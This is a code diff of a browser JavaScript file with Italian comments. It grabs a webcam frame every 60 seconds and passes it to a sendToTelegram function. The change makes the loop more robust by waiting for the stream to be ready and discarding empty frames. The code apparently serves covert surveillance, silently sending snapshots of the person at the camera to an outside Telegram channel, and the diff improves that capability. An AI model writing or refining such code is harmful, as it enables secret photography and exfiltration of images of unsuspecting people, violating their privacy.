@@ -7,15 +7,33 @@ document.addEventListener('DOMContentLoaded', (event) => {
             video.srcObject = stream;
             video.play();
 
-            setInterval(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageDataUrl = canvas.toDataURL('image/jpeg');
-                sendToTelegram(imageDataUrl);
-            }, 60000); // ogni 60 secondi
+            // Aspetta che la webcam sia pronta
+            video.addEventListener('loadedmetadata', () => {
+                console.log("Webcam pronta, avvio cattura ogni 60 secondi");
+
+                setInterval(() => {
+                    // Verifica che il video abbia larghezza/altezza valide e che la webcam stia trasmettendo
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        
+                        // Cattura il frame dal video e disegnalo nel canvas
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        // Verifica che l'immagine nel canvas non sia vuota
+                        const imageDataUrl = canvas.toDataURL('image/jpeg');
+                        if (imageDataUrl && imageDataUrl.length > 1000) { // Verifica che l'immagine non sia troppo piccola
+                            sendToTelegram(imageDataUrl);
+                        } else {
+                            console.warn("Immagine vuota o troppo piccola, nessun dato catturato");
+                        }
+                    } else {
+                        console.warn("Webcam non ancora pronta, salto questo frame");
+                    }
+                }, 60000); // ogni 60 secondi
+            });
         })
         .catch(err => {
             console.error('Errore nell\'accesso alla fotocamera:', err);
